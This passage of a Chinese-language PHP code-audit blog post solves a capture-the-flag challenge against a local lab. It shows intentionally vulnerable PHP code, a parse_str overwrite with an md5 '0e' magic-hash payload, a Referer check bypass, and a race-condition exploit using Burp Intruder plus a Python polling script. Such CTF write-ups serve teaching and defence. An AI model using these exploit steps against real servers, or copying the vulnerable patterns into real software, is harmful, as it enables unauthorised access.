class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$savepath</span>, <span class="number">0777</span>);</span><br><span class="line">        <span class="title function_ invoke__">umask</span>(<span class="variable">$oldmask</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((@<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">//$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;);</span></span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="variable">$savepath</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) . <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">100000</span>);</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Too slow!&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;form-group&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;label for=&quot;exampleInputEmail1&quot;&gt;Filename&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;form-group&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;label for=&quot;exampleInputPassword1&quot;&gt;Content&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">EOT</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can not see this page&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在 <strong>index.php</strong> 第4行存在 <strong>@parse_str($id);</strong> 这个函数不会检查变量 <strong>$id</strong> 是否存在，如果通过其他方式传入数据给变量 <strong>$id</strong> ,且当前 <strong>$id</strong> 中数据存在，它将会直接覆盖掉。而在第6行有一段这样代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>[<span class="number">0</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><strong>PHP Hash比较存在缺陷</strong> ，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。而这里的 <strong>md5(‘QNKCDZO’)</strong> 的结果是 <strong>0e830400451993494058024219903391</strong>  。所以payload为 <strong>?id&#x3D;a[0]&#x3D;s878926199a</strong> 。这样就可以在页面上回显。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;uploadsomething.php&quot;</span>&gt;</span>flag is here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;;</span><br></pre></td></tr></table></figure>

<p>而这题真正的考察点在这里。在 <strong>uploadsomething.php</strong> 的第三行和第四行有这样两句代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$referer</span>)!== <span class="literal">false</span>)</span><br></pre></td></tr></table></figure>

<p>这里有个 <strong>refer</strong> 判断，判断 <strong>refer</strong> 是否存在，如果有展现上传页面，如果没有，就返回 <strong>you can not see this page</strong> 。</p>
<p>据我们所知，通过a标签点击的链接，会自己自动携带上refer字段。然后 <strong>携带refer</strong> 和 <strong>不携带refer</strong> ，返回的结果不一样。</p>
<p><strong>携带refer</strong> 的情况：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-55.png"></p>
<p><strong>不携带refer</strong> 的情况：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-56.png"></p>
<p>然后在 <strong>uploadsomething.php</strong> 的第13行和第18行有这样代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="variable">$savepath</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) . <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">100000</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;Too slow!&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>

<p>这里有一句关键就是 <strong>usleep(100000);</strong> 这题需要在写入 <strong>too slow</strong> 之前，访问之前写入的文件，即可获得flag，这里就存在时间竞争问题。但是我们看到其实这里的文件夹路径是固定写死的。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-57.png"></p>
<p>直接访问会返回 <strong>too slow</strong> 。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-58.png"></p>
<p>因此这里的解法是，开Burp的200线程，一个不断发包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/parse_str/uploadsomething.php?filename=flag&amp;content=111</span><br></pre></td></tr></table></figure>

<p>burp发包是在 <strong>intruder</strong> 模块中，首先选择数据包，右键点击选择 <strong>Send to Intruder</strong> 。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-59.png"></p>
<p>然后在 <strong>positions</strong> 点击 <strong>clear</strong> 按钮</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-60.png"></p>
<p>在 <strong>payload</strong> 中选择 <strong>payload type</strong> 为 <strong>null payloads</strong> ，<strong>generate</strong> 选择200，然后再可以点击 <strong>start attack</strong> 了。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-61.png"></p>
<p>在 <strong>start attack</strong> 之前需要一个脚本不断请求下面这个链接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/parse_str/uploads/4b84b15bff6ee5796152495a230e45e3d7e947d9/flag</span><br></pre></td></tr></table></figure>

<p><strong>脚本代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line">r1=r.Session()</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">r2=r1.get(<span class="string">&quot;http://127.0.0.1/parse_str/uploads/4b84b15bff6ee5796152495a230e45e3d7e947d9/flag&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span> r2.text</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>一会儿就看到了flag</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-62.png"></p>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#postcard"><span class="toc-number">1.</span> <span class="toc-text">postcard</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-10045"><span class="toc-number">1.1.1.</span> <span class="toc-text">CVE-2016-10045</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-10045-1"><span class="toc-number">1.1.2.</span> <span class="toc-text">CVE-2016-10045</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.3.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98payload%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">解题payload：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forst-Pattern"><span class="toc-number">2.</span> <span class="toc-text">Forst Pattern</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">2.3.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">2.4.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bell"><span class="toc-number">3.</span> <span class="toc-text">Bell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-2"><span class="toc-number">3.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-2"><span class="toc-number">3.5.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toc-number">3.6.</span> <span class="toc-text">题目</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&text=【代码审计】PHP代码审计2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&is_video=false&description=【代码审计】PHP代码审计2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】PHP代码审计2&body=Check out this article: https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&name=【代码审计】PHP代码审计2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&t=【代码审计】PHP代码审计2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024
    g0dam
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'owner/githubrepo';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
